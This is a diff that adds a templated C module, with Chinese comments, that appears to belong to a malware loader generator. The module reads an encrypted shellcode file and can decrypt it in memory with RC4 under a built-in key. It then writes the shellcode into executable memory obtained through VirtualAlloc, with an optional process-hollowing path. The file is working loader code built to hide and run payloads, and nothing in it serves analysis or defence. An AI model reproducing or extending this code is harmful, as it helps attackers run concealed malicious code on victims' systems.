@@ -1,0 +1,157 @@
+// Shellcode读取和写入模块
+{% if enable_debug %}
+#define _DEBUG
+{% endif %}
+
+// 函数声明
+PBYTE ReadShellcodeFromFile(LPCWSTR filePath, PDWORD pSize);
+BOOL DecryptShellcodeInMemory(PBYTE shellcode, DWORD size);
+PBYTE WriteShellcodeToMemory(PBYTE shellcode, DWORD size);
+BOOL LoadShellcode(LPCWSTR filePath, PBYTE* pShellcode, PDWORD pSize);
+
+// 从本地文件读取Shellcode（加密文件）
+PBYTE ReadShellcodeFromFile(LPCWSTR filePath, PDWORD pSize) {
+#ifdef _DEBUG
+    printf("[*] 开始读取加密Shellcode文件: %ls\n", filePath);
+#endif
+    
+    HANDLE hFile = CreateFileW(
+        filePath,
+        GENERIC_READ,
+        FILE_SHARE_READ,
+        NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+    
+    if (hFile == INVALID_HANDLE_VALUE) {
+#ifdef _DEBUG
+        printf("[!] 打开Shellcode文件失败，错误码: %d\n", GetLastError());
+#endif
+        return NULL;
+    }
+    
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    if (fileSize == INVALID_FILE_SIZE) {
+#ifdef _DEBUG
+        printf("[!] 获取文件大小失败，错误码: %d\n", GetLastError());
+#endif
+        CloseHandle(hFile);
+        return NULL;
+    }
+    
+#ifdef _DEBUG
+    printf("[*] 加密Shellcode文件大小: %d 字节\n", fileSize);
+#endif
+    
+    PBYTE shellcode = (PBYTE)LocalAlloc(LPTR, fileSize);
+    if (!shellcode) {
+#ifdef _DEBUG
+        printf("[!] 分配内存失败\n");
+#endif
+        CloseHandle(hFile);
+        return NULL;
+    }
+    
+    DWORD bytesRead;
+    if (!ReadFile(hFile, shellcode, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
+#ifdef _DEBUG
+        printf("[!] 读取文件不完整，预期: %d, 实际: %d\n", fileSize, bytesRead);
+#endif
+        LocalFree(shellcode);
+        CloseHandle(hFile);
+        return NULL;
+    }
+    
+    CloseHandle(hFile);
+    
+#ifdef _DEBUG
+    printf("[*] 成功读取加密Shellcode，大小: %d 字节\n", fileSize);
+#endif
+    
+    *pSize = fileSize;
+    return shellcode;
+}
+
+{% if encrypt_shellcode %}
+// Shellcode解密处理（在内存中解密）
+BOOL DecryptShellcodeInMemory(PBYTE shellcode, DWORD size) {
+#ifdef _DEBUG
+    printf("[*] 开始在内存中解密Shellcode\n");
+#endif
+    
+    // 使用预定义的密钥解密
+    RC4Crypt(shellcode, size, g_encryption_key, g_key_len);
+    
+#ifdef _DEBUG
+    printf("[*] Shellcode解密完成，内存中已是原始Shellcode\n");
+#endif
+    
+    return TRUE;
+}
+{% endif %}
+
+// Shellcode内存写入（根据加载方式）
+PBYTE WriteShellcodeToMemory(PBYTE shellcode, DWORD size) {
+#ifdef _DEBUG
+    printf("[*] 开始写入Shellcode到内存\n");
+#endif
+    
+    {% if use_process_hollowing %}
+    // 进程空洞注入不需要在当前进程分配内存
+    return shellcode;  // 直接返回原始shellcode指针
+    {% else %}
+    // 常规内存分配
+    LPVOID execMem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!execMem) {
+#ifdef _DEBUG
+        printf("[!] VirtualAlloc失败，错误码: %d\n", GetLastError());
+#endif
+        return NULL;
+    }
+    
+    memcpy(execMem, shellcode, size);
+    
+#ifdef _DEBUG
+    printf("[*] Shellcode已写入内存，地址: %p\n", execMem);
+#endif
+    
+    return (PBYTE)execMem;
+    {% endif %}
+}
+
+// 完整的Shellcode加载流程
+BOOL LoadShellcode(LPCWSTR filePath, PBYTE* pShellcode, PDWORD pSize) {
+#ifdef _DEBUG
+    printf("[*] ========== 开始Shellcode加载流程 ==========\n");
+#endif
+    
+    // 1. 读取加密Shellcode文件
+    PBYTE encryptedShellcode = ReadShellcodeFromFile(filePath, pSize);
+    if (!encryptedShellcode) {
+#ifdef _DEBUG
+        printf("[!] Shellcode读取失败\n");
+#endif
+        return FALSE;
+    }
+    
+    {% if encrypt_shellcode %}
+    // 2. 在内存中解密Shellcode
+    if (!DecryptShellcodeInMemory(encryptedShellcode, *pSize)) {
+#ifdef _DEBUG
+        printf("[!] Shellcode解密失败\n");
+#endif
+        LocalFree(encryptedShellcode);
+        return FALSE;
+    }
+    {% endif %}
+    
+    *pShellcode = encryptedShellcode;
+    
+#ifdef _DEBUG
+    printf("[*] ========== Shellcode加载流程完成 ==========\n");
+#endif
+    
+    return TRUE;
+}
